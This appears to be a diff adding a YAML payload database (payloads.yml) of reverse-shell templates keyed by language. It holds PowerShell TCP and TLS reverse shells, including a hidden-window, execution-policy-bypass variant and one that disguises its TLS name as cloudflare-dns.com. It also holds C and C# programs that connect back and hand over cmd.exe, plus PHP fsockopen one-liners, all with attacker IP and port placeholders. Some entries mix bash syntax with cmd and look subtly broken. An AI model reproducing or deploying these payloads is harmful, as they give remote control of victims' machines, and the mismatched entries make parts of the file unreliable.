@@ -1,0 +1,148 @@
+# Payload Yaml Database | payloads.yml
+#   Made by @truerubn on github
+# 
+# UNDER THE GNU GPL 2.0 LICENSE  
+scripts:
+  ps1:
+    tcpscript: '$LHOST = "{YOURIP}"; $LPORT = {YOURPORT}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'
+    tcpcommand: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient("${YOURIP}",{YOURPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
+    tcphiddencmd: 'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient("${YOURIP}", {YOURPORT});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + ''SHELL> '');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"'
+    tls: '$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient("${YOURIP}", {YOURPORT});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient(''cloudflare-dns.com'',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + ''SHELL> '');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()'
+  c/cs: 
+    cwindows: >
+      #include <winsock2.h>
+      #include <stdio.h>
+      #pragma comment(lib,"ws2_32")
+
+      WSADATA wsaData;
+      SOCKET Winsock;
+      struct sockaddr_in hax; 
+      char ip_addr[16] = "${YOURIP}"; 
+      char port[6] = "${YOURPORT}";            
+
+      STARTUPINFO ini_processo;
+
+      PROCESS_INFORMATION processo_info;
+
+      int main()
+      {
+          WSAStartup(MAKEWORD(2, 2), &wsaData);
+          Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+
+
+          struct hostent *host; 
+          host = gethostbyname(ip_addr);
+          strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));
+
+          hax.sin_family = AF_INET;
+          hax.sin_port = htons(atoi(port));
+          hax.sin_addr.s_addr = inet_addr(ip_addr);
+
+          WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
+
+          memset(&ini_processo, 0, sizeof(ini_processo));
+          ini_processo.cb = sizeof(ini_processo);
+          ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
+          ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
+
+          TCHAR cmd[255] = TEXT("cmd.exe");
+
+          CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
+
+          return 0;
+      } 
+    cstcp: >
+      using System;
+      using System.Text;
+      using System.IO;
+      using System.Diagnostics;
+      using System.ComponentModel;
+      using System.Linq;
+      using System.Net;
+      using System.Net.Sockets;
+
+
+      namespace ConnectBack
+      {
+          public class Program
+          {
+              static StreamWriter streamWriter;
+
+              public static void Main(string[] args)
+              {
+                  using(TcpClient client = new TcpClient("${YOURIP}", ${YOURPORT}))
+                  {
+                      using(Stream stream = client.GetStream())
+                      {
+                          using(StreamReader rdr = new StreamReader(stream))
+                          {
+                              streamWriter = new StreamWriter(stream);
+                              
+                              StringBuilder strInput = new StringBuilder();
+
+                              Process p = new Process();
+                              p.StartInfo.FileName = "cmd";
+                              p.StartInfo.CreateNoWindow = true;
+                              p.StartInfo.UseShellExecute = false;
+                              p.StartInfo.RedirectStandardOutput = true;
+                              p.StartInfo.RedirectStandardInput = true;
+                              p.StartInfo.RedirectStandardError = true;
+                              p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                              p.Start();
+                              p.BeginOutputReadLine();
+
+                              while(true)
+                              {
+                                  strInput.Append(rdr.ReadLine());
+                                  //strInput.Append("\n");
+                                  p.StandardInput.WriteLine(strInput);
+                                  strInput.Remove(0, strInput.Length);
+                              }
+                          }
+                      }
+                  }
+              }
+
+              private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+              {
+                  StringBuilder strOutput = new StringBuilder();
+
+                  if (!String.IsNullOrEmpty(outLine.Data))
+                  {
+                      try
+                      {
+                          strOutput.Append(outLine.Data);
+                          streamWriter.WriteLine(strOutput);
+                          streamWriter.Flush();
+                      }
+                      catch (Exception err) { }
+                  }
+              }
+
+          }
+      }
+    csbashdi: >
+      using System;
+      using System.Diagnostics;
+
+      namespace BackConnect {
+        class ReverseBash {
+          public static void Main(string[] args) {
+            Process proc = new System.Diagnostics.Process();
+            proc.StartInfo.FileName = "cmd";
+            proc.StartInfo.Arguments = "-c \"cmd -i >& /dev/tcp/${YOURIP}/${YOURPORT} 0>&1\"";
+            proc.StartInfo.UseShellExecute = false;
+            proc.StartInfo.RedirectStandardOutput = true;
+            proc.Start();
+
+            while (!proc.StandardOutput.EndOfStream) {
+              Console.WriteLine(proc.StandardOutput.ReadLine());
+            }
+          }
+        }
+      }
+  php:
+    sysphp: "php -r '$sock=fsockopen(\"${YOURIP}\",${YOURPORT});system(\"cmd <&3 >&3 2>&3\");'"
+    peehp: "php -r '$sock=fsockopen(\"${YOURIP}\",${YOURPORT});`cmd <&3 >&3 2>&3`;'"
+    popen: "php -r '$sock=fsockopen(\"${YOURIP}\",${YOURPORT});popen(\"cmd <&3 >&3 2>&3\", \"r\");'"
+    proc_open: "php -r '$sock=fsockopen(\"${YOURIP}\",${YOURPORT});$proc=proc_open(\"cmd\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
